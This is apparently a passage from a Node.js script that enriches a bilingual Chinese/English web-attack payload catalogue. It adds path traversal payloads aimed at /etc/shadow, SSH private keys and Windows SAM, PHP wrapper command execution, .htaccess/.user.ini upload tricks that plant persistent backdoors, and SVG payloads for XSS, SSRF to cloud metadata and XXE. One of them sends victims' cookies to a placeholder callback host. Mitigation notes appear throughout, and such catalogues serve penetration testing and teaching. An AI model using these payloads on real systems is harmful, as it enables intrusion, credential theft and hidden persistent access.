      { part: '\\\\xff\\\\xd8\\\\xff\\\\xe0', zh: 'JPEG 文件头 (SOI+APP0)', en: 'JPEG header (SOI+APP0)', type: 'encoding' },
      { part: 'BM', zh: 'BMP 文件头', en: 'BMP file header', type: 'encoding' },
      { part: '%PDF-1.4', zh: 'PDF 文件头标识', en: 'PDF file header identifier', type: 'encoding' },
      { part: 'PK\\\\x03\\\\x04', zh: 'ZIP/PK 文件头', en: 'ZIP/PK file header', type: 'encoding' },
      { part: 'RIFF', zh: 'RIFF 容器格式 (WebP/AVI)', en: 'RIFF container format (WebP/AVI)', type: 'encoding' },
    ]
  ),
];

console.log('Enriching file-mime exec commands...');
if (enrichExecCommands('file-mime', mimeExec.join('\n'))) changes++;

// --- file-traversal: enrich execution ---
const travExec = [
  e('1. 路径遍历 Payload 大全','1. Complete path traversal payloads',
`# === 基础 ../ 遍历 ===
../../../../etc/passwd
../../../../etc/shadow
../../../etc/hosts
../../../etc/hostname
../../../../etc/crontab
../../../../root/.bash_history
../../../../root/.ssh/id_rsa

# === 编码绕过 ===
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd          # URL 编码
%252e%252e%252f%252e%252e%252fetc%252fpasswd       # 双重 URL 编码
..%c0%af..%c0%af..%c0%afetc/passwd                 # Unicode/UTF-8
....//....//....//etc/passwd                        # 双写绕过
..././..././..././etc/passwd                        # 点号绕过

# === 空字节截断 ===
../../../../etc/passwd%00
../../../../etc/passwd%00.php
../../../../etc/passwd%00.jpg

# === PHP Wrapper ===
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data://text/plain,<?php phpinfo();?>
expect://id
expect://cat%20/etc/passwd

# === 压缩包 Wrapper ===
zip://uploads/shell.jpg%23shell.php
phar://uploads/shell.jpg/shell.php
phar://shell.phar/shell.php

# === Windows 路径 ===
C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts
C:\\\\Windows\\\\win.ini
C:\\\\boot.ini
C:\\\\Windows\\\\repair\\\\SAM
c:/windows/system32/drivers/etc/hosts
..\\\\..\\\\..\\\\windows\\\\win.ini
..%5c..%5c..%5cwindows\\\\win.ini

# === 敏感文件路径 ===
/etc/passwd  /etc/shadow  /etc/crontab
/etc/apache2/apache2.conf  /etc/nginx/nginx.conf  /etc/mysql/my.cnf
/var/www/html/config.php  /var/www/html/wp-config.php
/var/log/apache2/access.log  /var/log/nginx/access.log
/var/log/sshd.log  /var/log/auth.log  /var/log/syslog
/var/lib/php/sessions/sess_*
/proc/self/environ  /proc/self/cmdline  /proc/version
/proc/self/fd/0  /proc/self/fd/1  /proc/self/fd/2
/proc/net/tcp  /proc/cpuinfo
/root/.ssh/id_rsa  /root/.ssh/authorized_keys
WEB-INF/web.xml  WEB-INF/classes/application.properties

# === SSRF file:// 路径 ===
file:///etc/passwd
file:///proc/self/environ
file:///var/www/html/config.php
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/repair/SAM`,
    '最全面的路径遍历 Payload 集合：基础 ../ 遍历、URL/双写/Unicode 编码绕过、PHP Wrapper、压缩包伪协议、Windows 路径、40+ 敏感文件路径、SSRF file:// 协议',
    'Most comprehensive path traversal payload collection: basic ../, URL/double/Unicode encoding bypass, PHP wrappers, archive pseudo-protocols, Windows paths, 40+ sensitive file paths, SSRF file:// protocol',
    'all',
    [
      { part: '../../../../etc/passwd', zh: '经典 Linux 敏感文件读取', en: 'Classic Linux sensitive file read', type: 'path' },
      { part: '%2e%2e%2f', zh: 'URL 编码绕过 ../ 过滤', en: 'URL-encoded ../ filter bypass', type: 'encoding' },
      { part: '..%c0%af', zh: 'Unicode/UTF-8 超长编码', en: 'Unicode/UTF-8 overlong encoding', type: 'encoding' },
      { part: '....//', zh: '双写绕过 (.. 被替换为空)', en: 'Double-write bypass (.. replaced with empty)', type: 'technique' },
      { part: 'php://filter/', zh: 'PHP Filter Wrapper 读取源码', en: 'PHP Filter Wrapper for source reading', type: 'value' },
      { part: 'php://input', zh: 'PHP Input Wrapper — POST 正文执行', en: 'PHP Input Wrapper — POST body execution', type: 'value' },
      { part: 'data://text/plain;base64,', zh: 'Data URL — 直接嵌入代码执行', en: 'Data URL — inline code execution', type: 'value' },
      { part: 'expect://id', zh: 'Expect Wrapper — 直接命令执行', en: 'Expect Wrapper — direct command execution', type: 'value' },
      { part: 'zip:// phar://', zh: '压缩包伪协议—从 ZIP/Phar 提取执行', en: 'Archive wrappers — extract and execute from ZIP/Phar', type: 'value' },
      { part: 'C:\\\\Windows\\\\', zh: 'Windows 路径遍历', en: 'Windows path traversal', type: 'path' },
      { part: '/proc/self/environ', zh: '/proc 伪文件系统—进程环境变量', en: '/proc pseudo-filesystem — process environment', type: 'path' },
      { part: '/var/log/apache2/access.log', zh: '日志文件路径—日志投毒目标', en: 'Log file paths — log poisoning targets', type: 'path' },
      { part: 'WEB-INF/web.xml', zh: 'Java Web 应用配置文件', en: 'Java web application configuration', type: 'path' },
      { part: 'file:///etc/passwd', zh: 'SSRF file:// 协议本地文件读取', en: 'SSRF file:// protocol local file read', type: 'technique' },
    ]
  ),
];

console.log('Enriching file-traversal exec commands...');
if (enrichExecCommands('file-traversal', travExec.join('\n'))) changes++;

// ============================================================
// 4. ADD NEW PAYLOADS: file-upload-config, file-upload-svg
// Insert after file-upload-bypass (find the end of that payload)
// ============================================================

// Find end of file-upload-bypass payload by locating the next payload
const fbIdx = content.indexOf("id: 'file-upload-bypass'");
let nextPayloadMatch = null;
// Find next `  {` followed by `id:` at the top level
const afterFb = content.slice(fbIdx + 30);
nextPayloadMatch = afterFb.match(/\n  \{\s*\n\s*id: '([^']+)'/);
if (nextPayloadMatch) {
  console.log('Next payload after file-upload-bypass:', nextPayloadMatch[1]);
  const insertPos = fbIdx + 30 + nextPayloadMatch.index;

  // Insert new payloads before the next payload
  const newPayloadsStr = `  {
    id: 'file-upload-config',
    name: { zh: '.htaccess/.user.ini上传', en: '.htaccess/.user.ini Upload' },
    description: { zh: '上传服务端配置文件覆盖目录解析规则，将图片映射为脚本执行或自动包含后门', en: 'Upload server config files to override directory parsing rules, mapping images to script execution or auto-including backdoors' },
    category: { zh: '文件漏洞', en: 'File Vulnerabilities' },
    subCategory: { zh: '文件上传', en: 'File Upload' },
    tags: ['upload','config','htaccess','user.ini','apache','php-fpm'],
    prerequisites: [
      { zh: '目标使用 Apache HTTPD 或 PHP-FPM', en: 'Target uses Apache HTTPD or PHP-FPM' },
      { zh: '上传目录允许覆盖配置文件', en: 'Upload directory allows config file override' },
    ],
    execution: [
      {
        title: { zh: '1. .htaccess AddType 映射', en: '1. .htaccess AddType mapping' },
        command: \`# 上传 .htaccess 文件 (Content-Type: text/plain):
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddHandler php5-script .jpg
AddHandler php-script .jpg
SetHandler application/x-httpd-php
<FilesMatch "\\\\\\\\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>

# 上传后，再上传 shell.jpg (包含 PHP 代码)
# 访问 shell.jpg → Apache 将其作为 PHP 执行\`,
        description: { zh: '通过 AddType/AddHandler/SetHandler 将图片扩展名映射为 PHP 处理器，使后续上传的图片被当作 PHP 执行', en: 'Map image extensions to PHP handler via AddType/AddHandler/SetHandler, causing subsequently uploaded images to execute as PHP scripts' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'AddType application/x-httpd-php', explanation: { zh: 'Apache 指令：将指定扩展名映射到 PHP MIME', en: 'Apache directive: map extension to PHP MIME' }, type: 'technique' },
          { part: 'SetHandler', explanation: { zh: '强制所有文件使用指定处理器', en: 'Force all files to use specified handler' }, type: 'technique' },
        ]
      },
      {
        title: { zh: '2. .user.ini 自动包含', en: '2. .user.ini auto-include' },
        command: \`# 上传 .user.ini (PHP-FPM/FastCGI):
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg

# 上传 shell.jpg 包含 PHP 代码
# 此后该目录下所有 PHP 页面加载时自动包含 shell.jpg 中的代码\`,
        description: { zh: 'PHP-FPM 环境下通过 .user.ini 的 auto_prepend_file/auto_append_file 在每页加载前自动包含后门代码', en: 'Under PHP-FPM, use .user.ini auto_prepend_file/auto_append_file to auto-include backdoor code on every page load' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'auto_prepend_file', explanation: { zh: 'PHP-FPM 指令：脚本执行前自动包含指定文件', en: 'PHP-FPM directive: auto-include file before script execution' }, type: 'technique' },
          { part: 'auto_append_file', explanation: { zh: 'PHP-FPM 指令：脚本执行后自动包含指定文件', en: 'PHP-FPM directive: auto-include file after script execution' }, type: 'technique' },
        ]
      },
      {
        title: { zh: '3. 平台解析漏洞利用', en: '3. Platform parser exploitation' },
        command: \`# Nginx 文件名截断 (CVE-2013-4547):
# 上传 shell.jpg[0x20][0x0a].php → 截断为 shell.jpg 但按 PHP 执行

# IIS 6.0 分号截断:
filename="shell.asp;.jpg"  shell.asa;.jpg  shell.cer;.jpg

# IIS 7.0+ 路径解析:
# 上传 shell.jpg → 访问 http://target.com/uploads/shell.jpg/.php

# Apache 多后缀回溯:
# shell.php.jpg → 若 .jpg 不可识别，回溯到 .php 处理器\`,
        description: { zh: '利用各平台解析特性：Nginx 截断、IIS 分号/路径解析、Apache 多后缀回溯，无需配置文件即可实现代码执行', en: 'Exploit platform-specific parsing: Nginx truncation, IIS semicolon/path parsing, Apache multi-suffix fallback for code execution without config files' },
        platform: 'all',
        syntaxBreakdown: [
          { part: 'CVE-2013-4547', explanation: { zh: 'Nginx 文件名解析漏洞', en: 'Nginx filename parsing vulnerability' }, type: 'value' },
          { part: '.asp;.jpg', explanation: { zh: 'IIS 6.0 分号截断', en: 'IIS 6.0 semicolon truncation' }, type: 'technique' },
        ]
      },
    ],
    attackChain: [
      { title: { zh: '探测服务器类型', en: 'Identify server type' }, description: { zh: '通过响应头和错误页面确认 Web 服务器类型(Apache/Nginx/IIS)和 PHP 运行模式。', en: 'Identify web server type (Apache/Nginx/IIS) and PHP SAPI via response headers and error pages.' } },
      { title: { zh: '上传配置文件', en: 'Upload configuration file' }, description: { zh: '上传 .htaccess(Apache)或 .user.ini(PHP-FPM)，使用 text/plain Content-Type 绕过类型检查。', en: 'Upload .htaccess (Apache) or .user.ini (PHP-FPM) with text/plain Content-Type to bypass type checks.' } },
      { title: { zh: '验证配置生效', en: 'Verify config activation' }, description: { zh: '上传含 PHP 代码的图片文件，访问验证 PHP 是否被解析执行。', en: 'Upload an image containing PHP code and verify execution upon access.' } },
      { title: { zh: '持久化利用', en: 'Persistence exploitation' }, description: { zh: '利用 auto_prepend_file 实现无文件后门（所有 PHP 页面自动包含），建立长期隐蔽访问。', en: 'Establish fileless backdoors via auto_prepend_file (auto-included on every PHP page) for long-term stealthy access.' } },
    ],
    analysis: { zh: '配置文件上传是最隐蔽的文件上传攻击——.htaccess 覆盖 Apache 目录配置使图片被当作 PHP 执行，.user.ini 通过 auto_prepend_file 实现无文件后门。这类攻击不依赖扩展名绕过，配置文件本身是合法系统文件，常被忽视。', en: 'Configuration file upload is the stealthiest file upload attack — .htaccess overrides Apache directory config to execute images as PHP, while .user.ini enables fileless backdoors via auto_prepend_file. These bypass extension checks since config files are legitimate and often overlooked.' },
    references: [
      'https://httpd.apache.org/docs/current/howto/htaccess.html',
      'https://www.php.net/manual/en/configuration.file.per-user.php',
      'https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html',
    ],
    tutorial: {
      overview: { zh: '.htaccess(Apache)/.user.ini(PHP-FPM)配置文件上传利用技术，通过覆盖目录级配置使非脚本扩展名被当作 PHP 执行，或自动包含后门代码实现持久化。', en: '.htaccess (Apache) / .user.ini (PHP-FPM) config file upload exploits override directory-level settings for script execution or auto-backdoor inclusion for persistence.' },
      vulnerability: { zh: '文件上传功能通常只校验文件扩展名或内容类型，而 .htaccess/.user.ini 本身是纯文本配置文件，没有恶意特征。如果未禁止上传隐藏/点文件，攻击者即可上传。', en: 'File upload features typically only validate extensions or content types. .htaccess/.user.ini are plain-text config files without malicious signatures — if hidden/dot-files are not blocked, attackers can upload them.' },
      exploitation: { zh: '先确认服务器类型，再上传对应配置文件。Apache 使用 AddType 映射，PHP-FPM 使用 auto_prepend_file。上传配置后上传含 PHP 代码的图片并验证执行。', en: 'First identify the server type, then upload the corresponding config file. Use AddType mapping for Apache, auto_prepend_file for PHP-FPM. After config upload, upload a PHP-injected image and verify execution.' },
      mitigation: { zh: '禁止上传隐藏/配置文件(.htaccess/.user.ini)；使用 AllowOverride None；上传目录禁用 PHP 解析；对已上传文件进行常态化安全扫描。', en: 'Block upload of hidden/config files (.htaccess/.user.ini); use AllowOverride None; disable PHP execution in upload directories; conduct regular security scans of uploaded files.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'file-upload-svg',
    name: { zh: 'SVG文件上传利用', en: 'SVG File Upload Exploit' },
    description: { zh: '上传包含 XSS/SSRF 的 SVG 文件，利用 SVG 脚本执行和外部资源加载能力进行攻击', en: 'Upload SVG files with XSS/SSRF payloads, leveraging SVG script execution and external resource loading' },
    category: { zh: '文件漏洞', en: 'File Vulnerabilities' },
    subCategory: { zh: '文件上传', en: 'File Upload' },
    tags: ['upload','svg','xss','ssrf','xml'],
    prerequisites: [
      { zh: '目标允许 SVG 文件上传', en: 'Target allows SVG file upload' },
      { zh: '上传的 SVG 可在浏览器中直接访问', en: 'Uploaded SVG is accessible in browser' },
    ],
    execution: [
      {
        title: { zh: '1. SVG XSS', en: '1. SVG XSS' },
        command: \`<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='http://{CALLBACK}/?c='+document.cookie</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">

<svg xmlns="http://www.w3.org/2000/svg">
  <set attributeName="onmouseover" to="alert(1)" />
  <rect width="100" height="100" />
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>" />
</svg>\`,
        description: { zh: '在 SVG 中嵌入 JavaScript，当 SVG 被浏览器渲染时脚本执行——窃取 Cookie、重定向或执行任意 JS', en: 'Embed JavaScript in SVG; when rendered by browser, scripts execute — steal cookies, redirect, or execute arbitrary JS' },
        platform: 'all',
        syntaxBreakdown: [
          { part: '<script>alert(1)</script>', explanation: { zh: 'SVG 内联脚本（标准 XSS）', en: 'SVG inline script (standard XSS)' }, type: 'tag' },
          { part: 'onload=', explanation: { zh: 'SVG 事件处理器', en: 'SVG event handler' }, type: 'technique' },
          { part: '<use href=', explanation: { zh: 'SVG use 元素引用外部 SVG', en: 'SVG use element referencing external SVG' }, type: 'tag' },
        ]
      },
      {
        title: { zh: '2. SVG SSRF', en: '2. SVG SSRF' },
        command: \`<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://{CALLBACK}/ssrf-test"/>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://127.0.0.1:8080/admin"/>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <image href="file:///etc/passwd"/>
</svg>\`,
        description: { zh: '通过 SVG image 元素发起 SSRF 请求——访问云元数据、探测内网服务或读取本地文件', en: 'Initiate SSRF requests via SVG image elements — access cloud metadata, probe internal services, or read local files' },
        platform: 'all',
        syntaxBreakdown: [
          { part: '169.254.169.254', explanation: { zh: 'AWS 云元数据地址', en: 'AWS cloud metadata endpoint' }, type: 'domain' },
          { part: '<image href=', explanation: { zh: 'SVG 图片加载（触发服务端 HTTP 请求）', en: 'SVG image load (triggers server-side HTTP request)' }, type: 'tag' },
          { part: 'file:///', explanation: { zh: '本地文件读取', en: 'Local file read' }, type: 'technique' },
        ]
      },
      {
        title: { zh: '3. SVG XXE', en: '3. SVG XXE' },
        command: \`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://{CALLBACK}/xxe-test">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>\`,
        description: { zh: '利用 SVG 的 XML 基础注入 XXE payload——读取文件或发起外带请求', en: 'Exploit SVG XML foundation to inject XXE payloads for file reading or out-of-band requests' },
        platform: 'all',
        syntaxBreakdown: [
          { part: '<!ENTITY xxe SYSTEM', explanation: { zh: 'XXE 外部实体声明', en: 'XXE external entity declaration' }, type: 'technique' },
          { part: '&xxe;', explanation: { zh: '实体引用——触发文件读取', en: 'Entity reference — triggers file read' }, type: 'keyword' },
        ]
      },
    ],
    attackChain: [
      { title: { zh: '确认 SVG 上传允许', en: 'Confirm SVG upload allowed' }, description: { zh: '上传正常 SVG 文件确认目标接受 SVG 格式并返回可访问 URL。', en: 'Upload a benign SVG to confirm acceptance and accessible URL return.' } },
      { title: { zh: '注入 XSS Payload', en: 'Inject XSS payload' }, description: { zh: '嵌入 script 标签或 onload 事件，上传后访问验证 JavaScript 是否执行。', en: 'Embed script tags or onload events; upload and verify execution upon access.' }, payload: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">' },
      { title: { zh: '测试 SSRF/XXE', en: 'Test SSRF/XXE' }, description: { zh: '通过 image 元素引用内网地址或云元数据，或通过 DOCTYPE 实体声明发起 XXE。', en: 'Reference internal addresses or cloud metadata via image elements, or initiate XXE via DOCTYPE entity declaration.' } },
      { title: { zh: '结合 LFI 升级', en: 'Escalate with LFI' }, description: { zh: '在 SVG 元数据/注释中嵌入 PHP 代码，通过 LFI 包含上传的 SVG 执行代码。', en: 'Embed PHP code in SVG metadata/comments and include the uploaded file via LFI for code execution.' } },
    ],
    analysis: { zh: 'SVG 是基于 XML 的矢量图，支持 JavaScript/事件处理/外部资源加载。上传 SVG 涉及 XSS、SSRF 和 XXE 三重攻击面。许多应用接受 SVG 上传但仅校验 MIME 类型，忽略其 XML 和脚本能力。', en: 'SVG is an XML-based vector format supporting JavaScript, event handlers, and external resource loading. SVG upload involves XSS, SSRF, and XXE — triple attack surfaces. Many apps accept SVG but only check MIME type, overlooking XML and scripting capabilities.' },
    references: [
      'https://portswigger.net/web-security/file-upload',
      'https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html',
      'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files',
    ],
    tutorial: {
      overview: { zh: 'SVG 文件上传利用——利用 SVG 的 XML 特性实现 XSS、SSRF 和 XXE，将看似无害的图片上传扩展为多维度攻击。', en: 'SVG file upload exploitation — leverage SVG XML foundation for XSS, SSRF, and XXE, expanding seemingly harmless image uploads into multi-dimensional attacks.' },
      vulnerability: { zh: 'SVG 本质是 XML 文档，支持内嵌 script、事件处理器、外部 image 加载和 DOCTYPE 实体声明。仅校验 MIME 类型的上传机制无法防御这些攻击。', en: 'SVG is inherently an XML document supporting embedded scripts, event handlers, external image loading, and DOCTYPE entity declarations. MIME-only upload validation cannot defend against these vectors.' },
      exploitation: { zh: '上传含 XSS 的 SVG 到可访问路径，当用户/管理员访问时触发；通过 image 标签探测内网或读取云元数据；结合 DOCTYPE 实现 XXE 文件读取；在 SVG 注释中嵌入 PHP 代码结合 LFI 执行。', en: 'Upload XSS-injected SVG to accessible path for trigger upon access; probe internal networks or cloud metadata via image tags; achieve XXE file reading via DOCTYPE; embed PHP in comments for LFI execution.' },
      mitigation: { zh: '对 SVG 进行安全净化（移除 script/事件处理器/外部引用）；使用独立域名服务上传内容；创建位图副本去除脚本能力；上传目录禁用脚本解析。', en: 'Sanitize SVGs (remove scripts, event handlers, external references); serve uploaded content from separate domain; create bitmap copies to strip scripting; disable script parsing in upload directories.' },
      difficulty: 'intermediate'
    }
  },
`;

  content = content.slice(0, insertPos) + newPayloadsStr + content.slice(insertPos);
  console.log('Inserted new payloads: file-upload-config, file-upload-svg');
  changes += 2;
}

writeFileSync(filePath, content, 'utf8');
console.log('Total changes:', changes);
console.log('File written successfully.');
